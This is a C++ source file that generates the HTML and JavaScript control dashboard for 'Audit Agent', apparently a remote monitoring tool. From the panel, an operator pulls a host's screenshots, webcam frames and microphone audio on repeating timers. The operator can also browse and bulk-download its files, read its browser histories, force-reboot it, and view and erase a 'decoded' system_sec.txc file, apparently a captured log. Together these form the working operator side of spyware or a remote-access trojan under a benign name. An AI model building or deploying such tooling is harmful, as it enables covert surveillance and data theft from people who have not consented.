#include "AuditAgentUI.h"

#include <sstream>
#include <string>

std::string AuditAgentUI::DashboardHtml() {
    std::ostringstream html;

    html << R"HTML(
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Audit Agent</title>
<link rel="icon" type="image/svg+xml" href='data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"%3E%3Crect width="64" height="64" rx="14" fill="%230f172a"/%3E%3Cpath d="M32 8 52 16v14c0 13-8.5 22.5-20 26C20.5 52.5 12 43 12 30V16l20-8z" fill="%230ea5e9"/%3E%3Cpath d="M24 31.5 29.5 37 42 23.5" fill="none" stroke="white" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/%3E%3C/svg%3E'>

<style>
* { box-sizing: border-box; }

body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #0f1117;
    color: #e8e8e8;
    height: 100vh;
    overflow: hidden;
}

.app {
    display: flex;
    height: 100vh;
    width: 100vw;
}

.sidebar {
    width: 76px;
    background: #141722;
    border-right: 1px solid #2b3040;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding-top: 14px;
    gap: 12px;
}

.nav-item {
    display: flex;
    flex-direction: column;
    align-items: center;
}

.nav-btn {
    width: 54px;
    height: 54px;
    border: 1px solid #2e3446;
    background: #1b2030;
    color: #cfd7ff;
    border-radius: 14px;
    cursor: pointer;
    font-size: 20px;
    font-weight: bold;
    font-family: Arial, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
}

.nav-btn.active {
    background: #2d7dff;
    color: white;
    border-color: #2d7dff;
}

.nav-label {
    font-size: 10px;
    margin-top: 3px;
    color: #9aa3b8;
    text-align: center;
}
)HTML";

    html << R"HTML(
.main {
    flex: 1;
    display: flex;
    flex-direction: column;
    min-width: 0;
}

.topbar {
    height: 64px;
    border-bottom: 1px solid #2b3040;
    background: #151926;
    display: flex;
    align-items: center;
    padding: 0 18px;
    gap: 12px;
}

.topbar h1 {
    font-size: 18px;
    margin: 0;
    margin-right: auto;
}

.api-key {
    width: 280px;
    padding: 9px;
    background: #0c0e14;
    color: #eee;
    border: 1px solid #3a4054;
    border-radius: 8px;
}

.content {
    flex: 1;
    overflow: hidden;
    padding: 16px;
}

.page {
    display: none;
    height: 100%;
}

.page.active {
    display: flex;
    flex-direction: column;
}

.card {
    background: #171b28;
    border: 1px solid #2c3142;
    border-radius: 14px;
    padding: 14px;
    min-height: 0;
}

button {
    padding: 9px 13px;
    border: 0;
    border-radius: 8px;
    background: #2d7dff;
    color: white;
    cursor: pointer;
}

button:hover {
    background: #1e68d7;
}

button.secondary {
    background: #2a3040;
}

button.secondary:hover {
    background: #384055;
}

button.danger {
    background: #b91c1c;
}

button.danger:hover {
    background: #dc2626;
}

button:disabled {
    opacity: 0.45;
    cursor: not-allowed;
}

input, select, textarea {
    padding: 9px;
    border-radius: 8px;
    border: 1px solid #3a4054;
    background: #0c0e14;
    color: #eee;
}

.status {
    color: #aab2c8;
    font-size: 13px;
    margin-top: 8px;
    overflow-wrap: anywhere;
}
)HTML";

    html << R"HTML(
.desktop-grid,
.webcam-grid,
.audio-grid,
.system-sec-grid {
    display: grid;
    grid-template-rows: auto 1fr;
    gap: 14px;
    height: 100%;
}

.controls {
    display: flex;
    align-items: center;
    gap: 10px;
    flex-wrap: wrap;
}

.screenshot-wrap,
.webcam-wrap,
.audio-wrap,
.system-sec-wrap {
    height: 100%;
    overflow: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #080a0f;
    border-radius: 12px;
    border: 1px solid #2c3142;
    padding: 24px;
}

#screenshot,
#webcamFrame {
    max-width: 100%;
    border-radius: 8px;
    background: #000;
}

.audio-panel {
    width: 100%;
    max-width: 760px;
    background: #111622;
    border: 1px solid #2c3142;
    border-radius: 14px;
    padding: 24px;
}

#audioPlayer {
    width: 100%;
    margin-top: 14px;
}

#systemSecContent {
    width: 100%;
    height: 100%;
    resize: none;
    background: #080a0f;
    color: #e8e8e8;
    border: 1px solid #2c3142;
    border-radius: 10px;
    padding: 12px;
    font-family: Consolas, monospace;
    font-size: 13px;
    line-height: 1.45;
}

.files-layout {
    display: grid;
    grid-template-columns: 46% 54%;
    gap: 14px;
    height: 100%;
    min-height: 0;
}

.file-left,
.file-right {
    display: flex;
    flex-direction: column;
    min-height: 0;
}

.path-row {
    display: flex;
    gap: 8px;
    margin-bottom: 10px;
}

#currentPath {
    flex: 1;
    min-width: 0;
}

.action-row {
    display: flex;
    gap: 8px;
    margin-bottom: 10px;
    flex-wrap: wrap;
}
)HTML";

    html << R"HTML(
.table-wrap {
    flex: 1;
    overflow: auto;
    border: 1px solid #2c3142;
    border-radius: 10px;
}

table {
    width: 100%;
    border-collapse: collapse;
    table-layout: fixed;
}

th, td {
    border-bottom: 1px solid #292e3d;
    padding: 8px;
    font-size: 13px;
}

th {
    color: #b7bfd6;
    background: #1d2333;
    position: sticky;
    top: 0;
    z-index: 1;
}

.select-col {
    width: 42px;
    text-align: center;
}

.name-col {
    width: 58%;
}

.type-col {
    width: 14%;
    white-space: nowrap;
}

.size-col {
    width: 18%;
    text-align: right;
    white-space: nowrap;
}

.file-name {
    display: block;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

.file-prefix {
    color: #8f98ad;
    margin-right: 6px;
    font-family: Consolas, monospace;
    font-size: 12px;
}

a {
    color: #8ab4ff;
    text-decoration: none;
}

a:hover {
    text-decoration: underline;
}

.preview-header {
    display: flex;
    align-items: center;
    gap: 8px;
    margin-bottom: 10px;
    flex-wrap: wrap;
}

.preview-title {
    font-size: 14px;
    color: #cbd3e8;
    overflow-wrap: anywhere;
}

#previewContent {
    flex: 1;
    min-height: 0;
    overflow: auto;
    background: #080a0f;
    border: 1px solid #2c3142;
    border-radius: 10px;
    padding: 12px;
}

#previewContent pre {
    margin: 0;
    white-space: pre-wrap;
    font-family: Consolas, monospace;
    font-size: 13px;
}

#previewContent img {
    max-width: 100%;
    max-height: 100%;
    object-fit: contain;
}

#previewContent video {
    width: 100%;
    max-height: 100%;
    background: #000;
}
)HTML";

    html << R"HTML(
.history-layout {
    display: grid;
    grid-template-columns: 260px 1fr;
    gap: 14px;
    height: 100%;
    min-height: 0;
}

.browser-list {
    display: flex;
    flex-direction: column;
    gap: 8px;
}

.browser-btn {
    width: 100%;
    text-align: left;
    background: #202638;
}

.history-table-wrap {
    height: 100%;
    overflow: auto;
    border: 1px solid #2c3142;
    border-radius: 10px;
}

.history-url {
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

.small {
    font-size: 12px;
    color: #9aa3b8;
}
</style>
</head>

<body>
<div class="app">

    <div class="sidebar">
        <div class="nav-item">
            <button class="nav-btn active" id="navDesktop" onclick="showPage('desktop')">D</button>
            <div class="nav-label">Desktop</div>
        </div>

        <div class="nav-item">
            <button class="nav-btn" id="navFiles" onclick="showPage('files')">F</button>
            <div class="nav-label">Files</div>
        </div>

        <div class="nav-item">
            <button class="nav-btn" id="navHistory" onclick="showPage('history')">H</button>
            <div class="nav-label">History</div>
        </div>

        <div class="nav-item">
            <button class="nav-btn" id="navWebcam" onclick="showPage('webcam')">W</button>
            <div class="nav-label">Webcam</div>
        </div>

        <div class="nav-item">
            <button class="nav-btn" id="navAudio" onclick="showPage('audio')">A</button>
            <div class="nav-label">Audio</div>
        </div>

        <div class="nav-item">
            <button class="nav-btn" id="navSystemSec" onclick="showPage('systemsec')">S</button>
            <div class="nav-label">System</div>
        </div>
    </div>
)HTML";

    html << R"HTML(
    <div class="main">
        <div class="topbar">
            <h1 id="pageTitle">Desktop</h1>
            <span class="small">API Key</span>
            <input class="api-key" id="apiKey" type="password" value="">
            <button class="secondary" onclick="checkHealth()">Health</button>
            <button class="danger" onclick="confirmHostReboot()">Reboot Host</button>
        </div>

        <div class="content">

            <div class="page active" id="pageDesktop">
                <div class="desktop-grid">
                    <div class="card">
                        <div class="controls">
                            <button onclick="getScreenshot()">Get Screenshot</button>
                            <button class="secondary" onclick="saveScreenshot()">Save Screenshot</button>

                            <label class="small">Auto every</label>
                            <input id="autoSeconds" type="number" min="1" value="5" style="width:80px;">
                            <span class="small">seconds</span>
                            <button onclick="toggleAutoScreenshot()" id="autoBtn">Start Auto</button>
                        </div>
                        <div class="status" id="desktopStatus">Ready.</div>
                    </div>

                    <div class="screenshot-wrap">
                        <img id="screenshot" alt="Screenshot will appear here">
                    </div>
                </div>
            </div>

            <div class="page" id="pageFiles">
                <div class="files-layout">
                    <div class="card file-left">
                        <div class="path-row">
                            <input id="currentPath" type="text" value="C:\">
                            <button onclick="listFiles()">Open</button>
                            <button class="secondary" onclick="goUp()">Up</button>
                        </div>

                        <div class="action-row">
                            <button onclick="downloadSelected()">Download Selected</button>
                            <button class="secondary" onclick="clearSelection()">Clear</button>
                        </div>

                        <div class="status" id="fileStatus">No folder loaded.</div>

                        <div class="table-wrap">
                            <table id="fileTable">
                                <thead>
                                    <tr>
                                        <th class="select-col">Sel</th>
                                        <th class="name-col">Name</th>
                                        <th class="type-col">Type</th>
                                        <th class="size-col">Size</th>
                                    </tr>
                                </thead>
                                <tbody></tbody>
                            </table>
                        </div>
                    </div>
)HTML";

    html << R"HTML(
                    <div class="card file-right">
                        <div class="preview-header">
                            <button class="secondary" onclick="clearPreview()">Clear Preview</button>
                            <button class="secondary" onclick="savePreviewFile()">Save Preview</button>
                            <div class="preview-title" id="previewTitle">No file selected.</div>
                        </div>
                        <div id="previewContent">
                            Select a text, image, or video file to preview it here.
                        </div>
                    </div>
                </div>
            </div>

            <div class="page" id="pageHistory">
                <div class="history-layout">
                    <div class="card">
                        <h3>Browsers</h3>
                        <p class="small">Normal browser history only. Incognito/private history is not available.</p>

                        <div class="browser-list" id="browserList">
                            <button class="browser-btn" onclick="loadBrowserHistory('chrome')">Chrome</button>
                            <button class="browser-btn" onclick="loadBrowserHistory('edge')">Edge</button>
                            <button class="browser-btn" onclick="loadBrowserHistory('firefox')">Firefox</button>
                        </div>

                        <div class="status" id="historyStatus">Ready.</div>
                    </div>

                    <div class="card">
                        <h3 id="historyTitle">Browser History</h3>
                        <div class="history-table-wrap">
                            <table id="historyTable">
                                <thead>
                                    <tr>
                                        <th style="width:180px;">Time</th>
                                        <th>URL</th>
                                        <th style="width:100px;">Browser</th>
                                    </tr>
                                </thead>
                                <tbody></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>

            <div class="page" id="pageWebcam">
                <div class="webcam-grid">
                    <div class="card">
                        <div class="controls">
                            <button onclick="getWebcamFrame()">Capture Webcam Frame</button>
                            <button class="secondary" onclick="saveWebcamFrame()">Save Frame</button>

                            <label class="small">Camera</label>
                            <input id="cameraIndex" type="number" min="0" value="0" style="width:80px;">

                            <label class="small">Auto every</label>
                            <input id="webcamAutoSeconds" type="number" min="1" value="5" style="width:80px;">
                            <span class="small">seconds</span>

                            <button onclick="toggleAutoWebcam()" id="webcamAutoBtn">Start Auto</button>
                        </div>
                        <div class="status" id="webcamStatus">Ready.</div>
                    </div>

                    <div class="webcam-wrap">
                        <img id="webcamFrame" alt="Webcam frame will appear here">
                    </div>
                </div>
            </div>
)HTML";

    html << R"HTML(
            <div class="page" id="pageAudio">
                <div class="audio-grid">
                    <div class="card">
                        <div class="controls">
                            <button onclick="captureAudioClip()">Capture Audio Clip</button>

                            <label class="small">Duration</label>
                            <input id="audioSeconds" type="number" min="1" max="30" value="3" style="width:80px;">
                            <span class="small">seconds</span>

                            <label class="small">Auto every</label>
                            <input id="audioAutoSeconds" type="number" min="1" value="5" style="width:80px;">
                            <span class="small">seconds</span>

                            <button onclick="toggleAutoAudio()" id="audioAutoBtn">Start Auto</button>
                        </div>
                        <div class="status" id="audioStatus">Ready.</div>
                    </div>

                    <div class="audio-wrap">
                        <div class="audio-panel">
                            <h2>Host Microphone Audio</h2>
                            <p class="small">
                                Captures short WAV clips from the microphone on the machine running AuditAgent.
                            </p>
                            <audio id="audioPlayer" controls></audio>
                        </div>
                    </div>
                </div>
            </div>

            <div class="page" id="pageSystemSec">
                <div class="system-sec-grid">
                    <div class="card">
                        <div class="controls">
                            <button onclick="loadSystemSec()">Load File</button>
                            <button class="danger" onclick="resetSystemSec()">Reset File</button>
                        </div>
                        <div class="status" id="systemSecStatus">Ready.</div>
                    </div>

                    <div class="system-sec-wrap">
                        <textarea id="systemSecContent" readonly placeholder="Decoded system_sec.txc content will appear here."></textarea>
                    </div>
                </div>
            </div>

        </div>
    </div>
</div>
)HTML";

    html << R"HTML(
<script>
const selectedFiles = new Set();

let autoTimer = null;
let webcamAutoTimer = null;
let audioAutoTimer = null;

let currentPreviewBlob = null;
let currentPreviewFileName = "";
let currentScreenshotBlob = null;
let currentWebcamBlob = null;

function apiKey() {
    const input = document.getElementById("apiKey");

    if (input && input.value) {
        return input.value;
    }

    return sessionStorage.getItem("auditagent_api_key") || "";
}

async function apiPost(path, payload) {
    payload = payload || {};
    payload.api_key = apiKey();

    return await fetch(path, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    });
}

function initApiKeyFromSession() {
    const saved = sessionStorage.getItem("auditagent_api_key");
    const input = document.getElementById("apiKey");

    if (saved && input) {
        input.value = saved;
    }
}

function timeStampName(prefix, extension) {
    const d = new Date();

    const pad = function(n) {
        return String(n).padStart(2, "0");
    };

    return prefix + "_" +
        d.getFullYear() +
        pad(d.getMonth() + 1) +
        pad(d.getDate()) + "_" +
        pad(d.getHours()) +
        pad(d.getMinutes()) +
        pad(d.getSeconds()) +
        extension;
}

function downloadBlob(blob, filename) {
    if (!blob) {
        alert("Nothing to save yet.");
        return;
    }

    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");

    a.href = url;
    a.download = filename;

    document.body.appendChild(a);
    a.click();
    a.remove();

    setTimeout(function() {
        URL.revokeObjectURL(url);
    }, 5000);
}
)HTML";

    html << R"HTML(
async function confirmHostReboot() {
    const first = confirm(
        "This will force reboot the HOST computer running AuditAgent.\n\nContinue?"
    );

    if (!first) {
        return;
    }

    const second = confirm(
        "Final confirmation: reboot now?\n\nUnsaved work on the host may be lost."
    );

    if (!second) {
        return;
    }

    try {
        const res = await apiPost("/api/host/reboot", {});
        const text = await res.text();

        if (!res.ok) {
            alert("Reboot failed:\n" + text);
            return;
        }

        alert("Reboot command sent to host.");
    } catch (e) {
        alert("Reboot request failed: " + e);
    }
}

function showPage(page) {
    document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
    document.querySelectorAll(".nav-btn").forEach(b => b.classList.remove("active"));

    if (page === "desktop") {
        document.getElementById("pageDesktop").classList.add("active");
        document.getElementById("navDesktop").classList.add("active");
        document.getElementById("pageTitle").textContent = "Desktop";
    }

    if (page === "files") {
        document.getElementById("pageFiles").classList.add("active");
        document.getElementById("navFiles").classList.add("active");
        document.getElementById("pageTitle").textContent = "Files";
    }

    if (page === "history") {
        document.getElementById("pageHistory").classList.add("active");
        document.getElementById("navHistory").classList.add("active");
        document.getElementById("pageTitle").textContent = "Browser History";
    }

    if (page === "webcam") {
        document.getElementById("pageWebcam").classList.add("active");
        document.getElementById("navWebcam").classList.add("active");
        document.getElementById("pageTitle").textContent = "Webcam";
    }

    if (page === "audio") {
        document.getElementById("pageAudio").classList.add("active");
        document.getElementById("navAudio").classList.add("active");
        document.getElementById("pageTitle").textContent = "Audio";
    }

    if (page === "systemsec") {
        document.getElementById("pageSystemSec").classList.add("active");
        document.getElementById("navSystemSec").classList.add("active");
        document.getElementById("pageTitle").textContent = "System Sec";
    }
}

async function checkHealth() {
    try {
        const res = await apiPost("/api/health", {});
        const text = await res.text();

        document.getElementById("desktopStatus").textContent = text;
    } catch (e) {
        document.getElementById("desktopStatus").textContent = "Health check failed: " + e;
    }
}
)HTML";

    html << R"HTML(
async function getScreenshot() {
    const status = document.getElementById("desktopStatus");
    const img = document.getElementById("screenshot");

    status.textContent = "Requesting screenshot...";

    try {
        const res = await apiPost("/api/screenshot", {});

        if (!res.ok) {
            status.textContent = "Error: " + res.status + " " + res.statusText;
            return;
        }

        const blob = await res.blob();
        currentScreenshotBlob = blob;

        if (img.dataset.objectUrl) {
            URL.revokeObjectURL(img.dataset.objectUrl);
        }

        const url = URL.createObjectURL(blob);
        img.dataset.objectUrl = url;
        img.src = url;

        status.textContent = "Screenshot received at " + new Date().toLocaleTimeString();
    } catch (e) {
        status.textContent = "Screenshot request failed: " + e;
    }
}

function saveScreenshot() {
    downloadBlob(
        currentScreenshotBlob,
        timeStampName("screenshot", ".bmp")
    );
}

function toggleAutoScreenshot() {
    const btn = document.getElementById("autoBtn");

    if (autoTimer) {
        clearInterval(autoTimer);
        autoTimer = null;
        btn.textContent = "Start Auto";
        document.getElementById("desktopStatus").textContent = "Auto screenshot stopped.";
        return;
    }

    const seconds = Math.max(1, Number(document.getElementById("autoSeconds").value || 5));

    getScreenshot();

    autoTimer = setInterval(function() {
        getScreenshot();
    }, seconds * 1000);

    btn.textContent = "Stop Auto";
    document.getElementById("desktopStatus").textContent = "Auto screenshot every " + seconds + " seconds.";
}

async function getWebcamFrame() {
    const status = document.getElementById("webcamStatus");
    const img = document.getElementById("webcamFrame");
    const cameraIndex = Number(document.getElementById("cameraIndex").value || 0);

    status.textContent = "Capturing webcam frame...";

    try {
        const res = await apiPost("/api/webcam/frame", {
            camera: cameraIndex
        });

        if (!res.ok) {
            status.textContent = await res.text();
            return;
        }

        const blob = await res.blob();
        currentWebcamBlob = blob;

        if (img.dataset.objectUrl) {
            URL.revokeObjectURL(img.dataset.objectUrl);
        }

        const url = URL.createObjectURL(blob);
        img.dataset.objectUrl = url;
        img.src = url;

        status.textContent = "Webcam frame captured at " + new Date().toLocaleTimeString();
    } catch (e) {
        status.textContent = "Webcam capture failed: " + e;
    }
}
)HTML";

    html << R"HTML(
function saveWebcamFrame() {
    downloadBlob(
        currentWebcamBlob,
        timeStampName("webcam_frame", ".jpg")
    );
}

function toggleAutoWebcam() {
    const btn = document.getElementById("webcamAutoBtn");
    const status = document.getElementById("webcamStatus");

    if (webcamAutoTimer) {
        clearInterval(webcamAutoTimer);
        webcamAutoTimer = null;
        btn.textContent = "Start Auto";
        status.textContent = "Auto webcam capture stopped.";
        return;
    }

    const seconds = Math.max(1, Number(document.getElementById("webcamAutoSeconds").value || 5));

    getWebcamFrame();

    webcamAutoTimer = setInterval(function() {
        getWebcamFrame();
    }, seconds * 1000);

    btn.textContent = "Stop Auto";
    status.textContent = "Auto webcam capture every " + seconds + " seconds.";
}

async function captureAudioClip() {
    const status = document.getElementById("audioStatus");
    const player = document.getElementById("audioPlayer");
    const seconds = Math.max(1, Math.min(30, Number(document.getElementById("audioSeconds").value || 3)));

    status.textContent = "Capturing " + seconds + " seconds of audio...";

    try {
        const res = await apiPost("/api/audio/capture", {
            seconds: seconds
        });

        if (!res.ok) {
            status.textContent = await res.text();
            return;
        }

        const blob = await res.blob();

        if (player.dataset.objectUrl) {
            URL.revokeObjectURL(player.dataset.objectUrl);
        }

        const url = URL.createObjectURL(blob);
        player.dataset.objectUrl = url;
        player.src = url;

        status.textContent = "Audio captured at " + new Date().toLocaleTimeString();

        try {
            await player.play();
        } catch (e) {
        }
    } catch (e) {
        status.textContent = "Audio capture failed: " + e;
    }
}

function toggleAutoAudio() {
    const btn = document.getElementById("audioAutoBtn");
    const status = document.getElementById("audioStatus");

    if (audioAutoTimer) {
        clearInterval(audioAutoTimer);
        audioAutoTimer = null;
        btn.textContent = "Start Auto";
        status.textContent = "Auto audio capture stopped.";
        return;
    }

    const everySeconds = Math.max(1, Number(document.getElementById("audioAutoSeconds").value || 5));

    captureAudioClip();

    audioAutoTimer = setInterval(function() {
        captureAudioClip();
    }, everySeconds * 1000);

    btn.textContent = "Stop Auto";
    status.textContent = "Auto audio capture every " + everySeconds + " seconds.";
}
)HTML";

    html << R"HTML(
async function loadSystemSec() {
    const status = document.getElementById("systemSecStatus");
    const box = document.getElementById("systemSecContent");

    status.textContent = "Loading system_sec.txc...";

    try {
        const res = await apiPost("/api/system-sec/read", {});
        const data = await res.json();

        if (!data.ok) {
            status.textContent = data.error || "Unable to load system_sec.txc.";
            return;
        }

        box.value = data.content || "";
        status.textContent = "Loaded system_sec.txc at " + new Date().toLocaleTimeString();
    } catch (e) {
        status.textContent = "Load failed: " + e;
    }
}

async function resetSystemSec() {
    const ok = confirm(
        "This will reset/recreate system_sec.txc and erase its current content.\n\nContinue?"
    );

    if (!ok) {
        return;
    }

    const status = document.getElementById("systemSecStatus");
    const box = document.getElementById("systemSecContent");

    status.textContent = "Resetting system_sec.txc...";

    try {
        const res = await apiPost("/api/system-sec/reset", {});
        const data = await res.json();

        if (!data.ok) {
            status.textContent = data.error || "Unable to reset system_sec.txc.";
            return;
        }

        box.value = "";
        status.textContent = "system_sec.txc reset successfully.";
    } catch (e) {
        status.textContent = "Reset failed: " + e;
    }
}

function formatSize(bytes) {
    if (!bytes || bytes <= 0) return "";

    const units = ["B", "KB", "MB", "GB", "TB"];
    let size = Number(bytes);
    let unit = 0;

    while (size >= 1024 && unit < units.length - 1) {
        size /= 1024;
        unit++;
    }

    return size.toFixed(unit === 0 ? 0 : 2) + " " + units[unit];
}

function fileNameFromPath(path) {
    const p = path.replaceAll("/", "\\");
    const idx = p.lastIndexOf("\\");
    return idx >= 0 ? p.substring(idx + 1) : p;
}

function isTextFile(name) {
    const n = name.toLowerCase();

    return n.endsWith(".txt") || n.endsWith(".log") || n.endsWith(".csv") ||
           n.endsWith(".json") || n.endsWith(".xml") || n.endsWith(".md") ||
           n.endsWith(".cpp") || n.endsWith(".h") || n.endsWith(".hpp") ||
           n.endsWith(".js") || n.endsWith(".css") || n.endsWith(".html") ||
           n.endsWith(".bat") || n.endsWith(".ps1") || n.endsWith(".ini");
}
)HTML";

    html << R"HTML(
function isImageFile(name) {
    const n = name.toLowerCase();

    return n.endsWith(".png") || n.endsWith(".jpg") || n.endsWith(".jpeg") ||
           n.endsWith(".gif") || n.endsWith(".bmp") || n.endsWith(".webp");
}

function isVideoFile(name) {
    const n = name.toLowerCase();

    return n.endsWith(".mp4") || n.endsWith(".webm") || n.endsWith(".ogg");
}

function canPreview(name) {
    return isTextFile(name) || isImageFile(name) || isVideoFile(name);
}

async function listFiles(pathOverride) {
    const pathInput = document.getElementById("currentPath");
    const fileStatus = document.getElementById("fileStatus");
    const tbody = document.querySelector("#fileTable tbody");

    const path = pathOverride || pathInput.value;

    fileStatus.textContent = "Loading folder...";
    tbody.innerHTML = "";

    try {
        const res = await apiPost("/api/files/list", {
            path: path
        });

        const data = await res.json();

        if (!data.ok) {
            fileStatus.textContent = "Error: " + data.error;
            return;
        }

        pathInput.value = data.path;
        fileStatus.textContent = "Loaded: " + data.path;

        for (const entry of data.entries) {
            const tr = document.createElement("tr");

            const selectTd = document.createElement("td");
            selectTd.className = "select-col";

            if (entry.type === "file") {
                const cb = document.createElement("input");
                cb.type = "checkbox";
                cb.checked = selectedFiles.has(entry.path);

                cb.onchange = function() {
                    if (cb.checked) {
                        selectedFiles.add(entry.path);
                    } else {
                        selectedFiles.delete(entry.path);
                    }
                };

                selectTd.appendChild(cb);
            }

            const nameTd = document.createElement("td");
            nameTd.className = "name-col";

            const nameSpan = document.createElement("span");
            nameSpan.className = "file-name";
            nameSpan.title = entry.path;

            const prefix = document.createElement("span");
            prefix.className = "file-prefix";
            prefix.textContent = entry.type === "directory" ? "[DIR]" : "[FILE]";
)HTML";

    html << R"HTML(
            if (entry.type === "directory") {
                const link = document.createElement("a");
                link.href = "#";
                link.appendChild(prefix);
                link.appendChild(document.createTextNode(entry.name));

                link.onclick = function(e) {
                    e.preventDefault();
                    listFiles(entry.path);
                };

                nameSpan.appendChild(link);
            } else if (canPreview(entry.name)) {
                const link = document.createElement("a");
                link.href = "#";
                link.appendChild(prefix);
                link.appendChild(document.createTextNode(entry.name));

                link.onclick = function(e) {
                    e.preventDefault();
                    previewFile(entry.path, entry.name);
                };

                nameSpan.appendChild(link);
            } else {
                nameSpan.appendChild(prefix);
                nameSpan.appendChild(document.createTextNode(entry.name));
            }

            nameTd.appendChild(nameSpan);

            const typeTd = document.createElement("td");
            typeTd.className = "type-col";
            typeTd.textContent = entry.type;

            const sizeTd = document.createElement("td");
            sizeTd.className = "size-col";
            sizeTd.textContent = entry.type === "file" ? formatSize(entry.size) : "";

            tr.appendChild(selectTd);
            tr.appendChild(nameTd);
            tr.appendChild(typeTd);
            tr.appendChild(sizeTd);

            tbody.appendChild(tr);
        }
    } catch (e) {
        fileStatus.textContent = "Request failed: " + e;
    }
}

function goUp() {
    const pathInput = document.getElementById("currentPath");
    let path = pathInput.value.replaceAll("/", "\\");

    if (path.endsWith("\\") && path.length > 3) {
        path = path.slice(0, -1);
    }

    if (path.length <= 3 && path[1] === ":") {
        listFiles(path);
        return;
    }

    const idx = path.lastIndexOf("\\");

    if (idx <= 2) {
        listFiles(path.substring(0, 3));
        return;
    }

    const parent = path.slice(0, idx);
    listFiles(parent);
}

async function downloadSingle(path) {
    const res = await apiPost("/api/files/download", {
        path: path
    });

    if (!res.ok) {
        alert(await res.text());
        return;
    }

    const blob = await res.blob();
    downloadBlob(blob, fileNameFromPath(path));
}
)HTML";

    html << R"HTML(
async function downloadSelected() {
    if (selectedFiles.size === 0) {
        alert("No files selected.");
        return;
    }

    const res = await apiPost("/api/files/download-zip", {
        paths: Array.from(selectedFiles)
    });

    if (!res.ok) {
        alert(await res.text());
        return;
    }

    const blob = await res.blob();
    downloadBlob(blob, "selected_files.zip");
}

function clearSelection() {
    selectedFiles.clear();
    listFiles();
}

function clearPreview() {
    currentPreviewBlob = null;
    currentPreviewFileName = "";

    document.getElementById("previewTitle").textContent = "No file selected.";
    document.getElementById("previewContent").innerHTML =
        "Select a text, image, or video file to preview it here.";
}

function savePreviewFile() {
    downloadBlob(
        currentPreviewBlob,
        currentPreviewFileName || "preview_file"
    );
}

async function previewFile(path, name) {
    const previewTitle = document.getElementById("previewTitle");
    const previewContent = document.getElementById("previewContent");

    previewTitle.textContent = path;
    previewContent.innerHTML = "Downloading file for preview...";

    const res = await apiPost("/api/files/download", {
        path: path
    });

    if (!res.ok) {
        previewContent.textContent = await res.text();
        return;
    }

    const blob = await res.blob();

    currentPreviewBlob = blob;
    currentPreviewFileName = name || fileNameFromPath(path);

    previewContent.innerHTML = "";

    if (isTextFile(name)) {
        const text = await blob.text();
        const pre = document.createElement("pre");
        pre.textContent = text;
        previewContent.appendChild(pre);
        return;
    }

    const url = URL.createObjectURL(blob);

    if (isImageFile(name)) {
        const img = document.createElement("img");
        img.src = url;
        previewContent.appendChild(img);
        return;
    }

    if (isVideoFile(name)) {
        const video = document.createElement("video");
        video.controls = true;
        video.src = url;
        previewContent.appendChild(video);
        return;
    }

    previewContent.textContent = "Preview not available.";
}
)HTML";

    html << R"HTML(
async function loadBrowserHistory(browserName) {
    const status = document.getElementById("historyStatus");
    const title = document.getElementById("historyTitle");
    const tbody = document.querySelector("#historyTable tbody");

    title.textContent = browserName + " History";
    status.textContent = "Loading " + browserName + " history...";
    tbody.innerHTML = "";

    try {
        const res = await apiPost("/api/browser/history", {
            browser: browserName
        });

        if (!res.ok) {
            status.textContent = await res.text();
            return;
        }

        const data = await res.json();

        if (!data.ok) {
            status.textContent = data.error || "Unable to load browser history.";
            return;
        }

        status.textContent = "Loaded " + data.entries.length + " entries.";

        for (const item of data.entries) {
            const tr = document.createElement("tr");

            const timeTd = document.createElement("td");
            timeTd.textContent = item.time || "";

            const urlTd = document.createElement("td");
            urlTd.className = "history-url";
            urlTd.title = item.url || "";
            urlTd.textContent = item.url || "";

            const browserTd = document.createElement("td");
            browserTd.textContent = item.browser || browserName;

            tr.appendChild(timeTd);
            tr.appendChild(urlTd);
            tr.appendChild(browserTd);

            tbody.appendChild(tr);
        }
    } catch (e) {
        status.textContent = "Browser history request failed: " + e;
    }
}

window.addEventListener("load", function() {
    initApiKeyFromSession();
    listFiles();
});
</script>
</body>
</html>
)HTML";

    return html.str();
}